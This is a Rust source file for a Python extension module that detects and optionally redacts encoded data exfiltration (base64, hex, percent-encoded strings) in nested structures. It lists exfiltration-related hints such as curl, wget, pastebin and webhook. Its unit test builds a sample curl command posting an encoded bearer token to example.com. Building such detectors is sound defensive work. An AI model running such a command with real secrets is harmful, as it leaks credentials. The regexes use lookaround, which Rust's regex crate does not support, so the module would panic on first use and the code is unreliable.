use base64::engine::general_purpose::{STANDARD, URL_SAFE};
use base64::Engine;
use pyo3::prelude::*;
use pyo3::types::{PyAny, PyDict, PyList, PyString};
use regex::Regex;
use std::collections::HashMap;
use std::sync::LazyLock;

static BASE64_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?<![A-Za-z0-9+/=])[A-Za-z0-9+/]{16,}={0,2}(?![A-Za-z0-9+/=])")
        .expect("failed to compile BASE64_RE")
});

static BASE64URL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?<![A-Za-z0-9_\-])[A-Za-z0-9_\-]{16,}={0,2}(?![A-Za-z0-9_\-])")
        .expect("failed to compile BASE64URL_RE")
});

static HEX_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?<![A-Fa-f0-9])[A-Fa-f0-9]{24,}(?![A-Fa-f0-9])")
        .expect("failed to compile HEX_RE")
});

static PERCENT_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:%[0-9A-Fa-f]{2}){8,}").expect("failed to compile PERCENT_RE")
});

static ESCAPED_HEX_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:\\x[0-9A-Fa-f]{2}){8,}").expect("failed to compile ESCAPED_HEX_RE")
});

const SENSITIVE_KEYWORDS: &[&[u8]] = &[
    b"password",
    b"passwd",
    b"secret",
    b"token",
    b"api_key",
    b"apikey",
    b"authorization",
    b"bearer",
    b"cookie",
    b"session",
    b"private key",
    b"ssh-rsa",
    b"refresh_token",
    b"client_secret",
];

const EGRESS_HINTS: &[&str] = &[
    "curl",
    "wget",
    "http://",
    "https://",
    "upload",
    "webhook",
    "beacon",
    "dns",
    "exfil",
    "pastebin",
    "socket",
    "send",
];

#[derive(Clone, Debug)]
struct DetectorConfig {
    enabled: HashMap<String, bool>,
    min_encoded_length: usize,
    min_decoded_length: usize,
    min_entropy: f64,
    min_printable_ratio: f64,
    min_suspicion_score: u32,
    max_scan_string_length: usize,
    max_findings_per_value: usize,
    redact: bool,
    redaction_text: String,
}

impl Default for DetectorConfig {
    fn default() -> Self {
        let mut enabled = HashMap::new();
        enabled.insert("base64".to_string(), true);
        enabled.insert("base64url".to_string(), true);
        enabled.insert("hex".to_string(), true);
        enabled.insert("percent_encoding".to_string(), true);
        enabled.insert("escaped_hex".to_string(), true);

        Self {
            enabled,
            min_encoded_length: 24,
            min_decoded_length: 12,
            min_entropy: 3.3,
            min_printable_ratio: 0.70,
            min_suspicion_score: 3,
            max_scan_string_length: 200_000,
            max_findings_per_value: 50,
            redact: false,
            redaction_text: "***ENCODED_REDACTED***".to_string(),
        }
    }
}

impl<'py> TryFrom<&Bound<'py, PyAny>> for DetectorConfig {
    type Error = PyErr;

    fn try_from(obj: &Bound<'py, PyAny>) -> PyResult<Self> {
        let default = DetectorConfig::default();

        let enabled = obj
            .getattr("enabled")
            .ok()
            .and_then(|v| v.extract::<HashMap<String, bool>>().ok())
            .unwrap_or(default.enabled.clone());

        let min_encoded_length = obj
            .getattr("min_encoded_length")
            .ok()
            .and_then(|v| v.extract::<usize>().ok())
            .unwrap_or(default.min_encoded_length);

        let min_decoded_length = obj
            .getattr("min_decoded_length")
            .ok()
            .and_then(|v| v.extract::<usize>().ok())
            .unwrap_or(default.min_decoded_length);

        let min_entropy = obj
            .getattr("min_entropy")
            .ok()
            .and_then(|v| v.extract::<f64>().ok())
            .unwrap_or(default.min_entropy);

        let min_printable_ratio = obj
            .getattr("min_printable_ratio")
            .ok()
            .and_then(|v| v.extract::<f64>().ok())
            .unwrap_or(default.min_printable_ratio);

        let min_suspicion_score = obj
            .getattr("min_suspicion_score")
            .ok()
            .and_then(|v| v.extract::<u32>().ok())
            .unwrap_or(default.min_suspicion_score);

        let max_scan_string_length = obj
            .getattr("max_scan_string_length")
            .ok()
            .and_then(|v| v.extract::<usize>().ok())
            .unwrap_or(default.max_scan_string_length);

        let max_findings_per_value = obj
            .getattr("max_findings_per_value")
            .ok()
            .and_then(|v| v.extract::<usize>().ok())
            .unwrap_or(default.max_findings_per_value);

        let redact = obj
            .getattr("redact")
            .ok()
            .and_then(|v| v.extract::<bool>().ok())
            .unwrap_or(default.redact);

        let redaction_text = obj
            .getattr("redaction_text")
            .ok()
            .and_then(|v| v.extract::<String>().ok())
            .unwrap_or(default.redaction_text.clone());

        Ok(Self {
            enabled,
            min_encoded_length,
            min_decoded_length,
            min_entropy,
            min_printable_ratio,
            min_suspicion_score,
            max_scan_string_length,
            max_findings_per_value,
            redact,
            redaction_text,
        })
    }
}

#[derive(Clone, Debug)]
struct Finding {
    encoding: String,
    path: String,
    start: usize,
    end: usize,
    score: u32,
    entropy: f64,
    decoded_len: usize,
    printable_ratio: f64,
    reason: Vec<String>,
    matched_preview: String,
}

fn normalize_padding(candidate: &str) -> String {
    let remainder = candidate.len() % 4;
    if remainder == 0 {
        return candidate.to_string();
    }
    format!("{}{}", candidate, "=".repeat(4 - remainder))
}

fn decode_percent(candidate: &str) -> Option<Vec<u8>> {
    let bytes = candidate.as_bytes();
    let mut out = Vec::with_capacity(bytes.len() / 3);
    let mut i = 0;

    while i < bytes.len() {
        if bytes[i] != b'%' || i + 2 >= bytes.len() {
            return None;
        }

        let hi = (bytes[i + 1] as char).to_digit(16)?;
        let lo = (bytes[i + 2] as char).to_digit(16)?;
        out.push(((hi << 4) + lo) as u8);
        i += 3;
    }

    Some(out)
}

fn decode_escaped_hex(candidate: &str) -> Option<Vec<u8>> {
    let bytes = candidate.as_bytes();
    let mut out = Vec::with_capacity(bytes.len() / 4);
    let mut i = 0;

    while i < bytes.len() {
        if i + 3 >= bytes.len() || bytes[i] != b'\\' || bytes[i + 1] != b'x' {
            return None;
        }

        let hi = (bytes[i + 2] as char).to_digit(16)?;
        let lo = (bytes[i + 3] as char).to_digit(16)?;
        out.push(((hi << 4) + lo) as u8);
        i += 4;
    }

    Some(out)
}

fn decode_candidate(encoding: &str, candidate: &str) -> Option<Vec<u8>> {
    match encoding {
        "base64" => STANDARD.decode(normalize_padding(candidate)).ok(),
        "base64url" => URL_SAFE.decode(normalize_padding(candidate)).ok(),
        "hex" => {
            if candidate.len() % 2 != 0 {
                return None;
            }
            let mut out = Vec::with_capacity(candidate.len() / 2);
            let bytes = candidate.as_bytes();
            let mut i = 0;
            while i < bytes.len() {
                let hi = (bytes[i] as char).to_digit(16)?;
                let lo = (bytes[i + 1] as char).to_digit(16)?;
                out.push(((hi << 4) + lo) as u8);
                i += 2;
            }
            Some(out)
        }
        "percent_encoding" => decode_percent(candidate),
        "escaped_hex" => decode_escaped_hex(candidate),
        _ => None,
    }
}

fn shannon_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }

    let mut counts = [0usize; 256];
    for byte in data {
        counts[*byte as usize] += 1;
    }

    let total = data.len() as f64;
    let mut entropy = 0.0;

    for count in counts {
        if count == 0 {
            continue;
        }
        let probability = count as f64 / total;
        entropy -= probability * probability.log2();
    }

    entropy
}

fn printable_ratio(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }

    let printable = data
        .iter()
        .filter(|byte| (32..=126).contains(byte) || **byte == b'\n' || **byte == b'\r' || **byte == b'\t')
        .count();

    printable as f64 / data.len() as f64
}

fn has_sensitive_keywords(decoded: &[u8]) -> bool {
    let lowered = decoded
        .iter()
        .map(|byte| byte.to_ascii_lowercase())
        .collect::<Vec<u8>>();

    SENSITIVE_KEYWORDS
        .iter()
        .any(|keyword| lowered.windows(keyword.len()).any(|window| window == *keyword))
}

fn has_egress_context(text: &str, start: usize, end: usize) -> bool {
    let lower = text.to_lowercase();
    let bytes = lower.as_bytes();
    let left = start.saturating_sub(80);
    let right = (end + 80).min(bytes.len());
    let window = String::from_utf8_lossy(&bytes[left..right]);
    EGRESS_HINTS.iter().any(|hint| window.contains(hint))
}

fn evaluate_candidate(
    text: &str,
    path: &str,
    encoding: &str,
    candidate: &str,
    start: usize,
    end: usize,
    cfg: &DetectorConfig,
) -> Option<Finding> {
    if candidate.len() < cfg.min_encoded_length {
        return None;
    }

    let decoded = decode_candidate(encoding, candidate)?;
    if decoded.len() < cfg.min_decoded_length {
        return None;
    }

    let entropy = shannon_entropy(&decoded);
    let printable = printable_ratio(&decoded);
    let sensitive_hit = has_sensitive_keywords(&decoded);
    let egress_hit = has_egress_context(text, start, end);

    let mut score = 1u32;
    let mut reasons = vec!["decodable".to_string()];

    if entropy >= cfg.min_entropy {
        score += 1;
        reasons.push("high_entropy".to_string());
    }

    if printable >= cfg.min_printable_ratio {
        score += 1;
        reasons.push("printable_payload".to_string());
    }

    if sensitive_hit {
        score += 2;
        reasons.push("sensitive_keywords".to_string());
    }

    if egress_hit {
        score += 1;
        reasons.push("egress_context".to_string());
    }

    if candidate.len() >= cfg.min_encoded_length * 2 {
        score += 1;
        reasons.push("long_segment".to_string());
    }

    if score < cfg.min_suspicion_score {
        return None;
    }

    let matched_preview = if candidate.len() > 24 {
        format!("{}…", &candidate[..24])
    } else {
        candidate.to_string()
    };

    Some(Finding {
        encoding: encoding.to_string(),
        path: if path.is_empty() {
            "$".to_string()
        } else {
            path.to_string()
        },
        start,
        end,
        score,
        entropy,
        decoded_len: decoded.len(),
        printable_ratio: printable,
        reason: reasons,
        matched_preview,
    })
}

fn apply_redactions(text: &str, findings: &[Finding], replacement: &str) -> String {
    let mut spans = findings
        .iter()
        .map(|finding| (finding.start, finding.end))
        .collect::<Vec<(usize, usize)>>();
    spans.sort_unstable();
    spans.dedup();

    let mut redacted = text.to_string();
    for (start, end) in spans.into_iter().rev() {
        redacted.replace_range(start..end, replacement);
    }

    redacted
}

fn scan_text(text: &str, path: &str, cfg: &DetectorConfig) -> (String, Vec<Finding>) {
    if text.is_empty() || text.len() > cfg.max_scan_string_length {
        return (text.to_string(), vec![]);
    }

    let mut findings_by_span: HashMap<(usize, usize), Finding> = HashMap::new();

    let detectors: [(&str, &Regex); 5] = [
        ("base64", &BASE64_RE),
        ("base64url", &BASE64URL_RE),
        ("hex", &HEX_RE),
        ("percent_encoding", &PERCENT_RE),
        ("escaped_hex", &ESCAPED_HEX_RE),
    ];

    for (encoding, regex) in detectors {
        if !cfg.enabled.get(encoding).copied().unwrap_or(true) {
            continue;
        }

        for matched in regex.find_iter(text) {
            if let Some(finding) = evaluate_candidate(
                text,
                path,
                encoding,
                matched.as_str(),
                matched.start(),
                matched.end(),
                cfg,
            ) {
                let key = (finding.start, finding.end);
                match findings_by_span.get(&key) {
                    Some(existing) if existing.score >= finding.score => {}
                    _ => {
                        findings_by_span.insert(key, finding);
                    }
                }

                if findings_by_span.len() >= cfg.max_findings_per_value {
                    break;
                }
            }
        }
    }

    let mut findings = findings_by_span.into_values().collect::<Vec<Finding>>();
    findings.sort_by_key(|item| (item.start, item.end));

    if !cfg.redact || findings.is_empty() {
        return (text.to_string(), findings);
    }

    (apply_redactions(text, &findings, &cfg.redaction_text), findings)
}

fn finding_to_dict<'py>(py: Python<'py>, finding: &Finding) -> PyResult<Bound<'py, PyDict>> {
    let finding_dict = PyDict::new(py);
    finding_dict.set_item("type", "encoded_exfiltration")?;
    finding_dict.set_item("encoding", &finding.encoding)?;
    finding_dict.set_item("path", &finding.path)?;
    finding_dict.set_item("start", finding.start)?;
    finding_dict.set_item("end", finding.end)?;
    finding_dict.set_item("score", finding.score)?;
    finding_dict.set_item("entropy", (finding.entropy * 1000.0).round() / 1000.0)?;
    finding_dict.set_item("decoded_len", finding.decoded_len)?;
    finding_dict.set_item(
        "printable_ratio",
        (finding.printable_ratio * 1000.0).round() / 1000.0,
    )?;
    finding_dict.set_item("reason", &finding.reason)?;
    finding_dict.set_item("match", &finding.matched_preview)?;
    Ok(finding_dict)
}

fn scan_container<'py>(
    py: Python<'py>,
    container: &Bound<'py, PyAny>,
    path: &str,
    cfg: &DetectorConfig,
) -> PyResult<(usize, Bound<'py, PyAny>, Bound<'py, PyList>)> {
    if let Ok(text) = container.extract::<String>() {
        let (redacted_text, findings) = scan_text(&text, path, cfg);
        let findings_list = PyList::empty(py);

        for finding in &findings {
            findings_list.append(finding_to_dict(py, finding)?)?;
        }

        return Ok((
            findings.len(),
            PyString::new(py, &redacted_text).into_any(),
            findings_list,
        ));
    }

    if let Ok(dict) = container.cast::<PyDict>() {
        let new_dict = PyDict::new(py);
        let all_findings = PyList::empty(py);
        let mut total = 0usize;

        for (key, value) in dict.iter() {
            let key_str = key.str()?.to_string_lossy().into_owned();
            let child_path = if path.is_empty() {
                key_str
            } else {
                format!("{}.{}", path, key_str)
            };

            let (count, redacted_value, child_findings) = scan_container(py, &value, &child_path, cfg)?;
            total += count;
            for item in child_findings.iter() {
                all_findings.append(item)?;
            }
            new_dict.set_item(key, redacted_value)?;
        }

        return Ok((total, new_dict.into_any(), all_findings));
    }

    if let Ok(list) = container.cast::<PyList>() {
        let new_list = PyList::empty(py);
        let all_findings = PyList::empty(py);
        let mut total = 0usize;

        for (index, item) in list.iter().enumerate() {
            let child_path = if path.is_empty() {
                format!("[{}]", index)
            } else {
                format!("{}[{}]", path, index)
            };
            let (count, redacted_item, child_findings) = scan_container(py, &item, &child_path, cfg)?;
            total += count;
            for finding in child_findings.iter() {
                all_findings.append(finding)?;
            }
            new_list.append(redacted_item)?;
        }

        return Ok((total, new_list.into_any(), all_findings));
    }

    Ok((0, container.clone(), PyList::empty(py)))
}

#[pyfunction]
fn py_scan_container<'py>(
    py: Python<'py>,
    container: Bound<'py, PyAny>,
    config: Bound<'py, PyAny>,
) -> PyResult<(usize, Bound<'py, PyAny>, Bound<'py, PyList>)> {
    let cfg = DetectorConfig::try_from(&config)?;
    scan_container(py, &container, "", &cfg)
}

#[pymodule]
fn encoded_exfil_detection(m: &Bound<'_, PyModule>) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(py_scan_container, m)?)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scan_text_detects_base64_sensitive_payload() {
        let cfg = DetectorConfig::default();
        let encoded = STANDARD.encode(b"authorization: bearer abcdefghijklmnop");
        let text = format!("curl -d '{}' https://example.com", encoded);
        let (_, findings) = scan_text(&text, "args.payload", &cfg);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].encoding, "base64");
        assert!(findings[0].score >= cfg.min_suspicion_score);
    }

    #[test]
    fn test_scan_text_redacts_when_enabled() {
        let cfg = DetectorConfig {
            redact: true,
            redaction_text: "[REDACTED]".to_string(),
            ..DetectorConfig::default()
        };

        let encoded = STANDARD.encode(b"password=my-secret-value");
        let text = format!("data={}", encoded);
        let (redacted, findings) = scan_text(&text, "", &cfg);

        assert_eq!(findings.len(), 1);
        assert!(redacted.contains("[REDACTED]"));
        assert!(!redacted.contains(&encoded));
    }

    #[test]
    fn test_scan_text_ignores_short_candidates() {
        let cfg = DetectorConfig::default();
        let text = "token=YWJjZA==";
        let (_, findings) = scan_text(text, "", &cfg);
        assert!(findings.is_empty());
    }
}
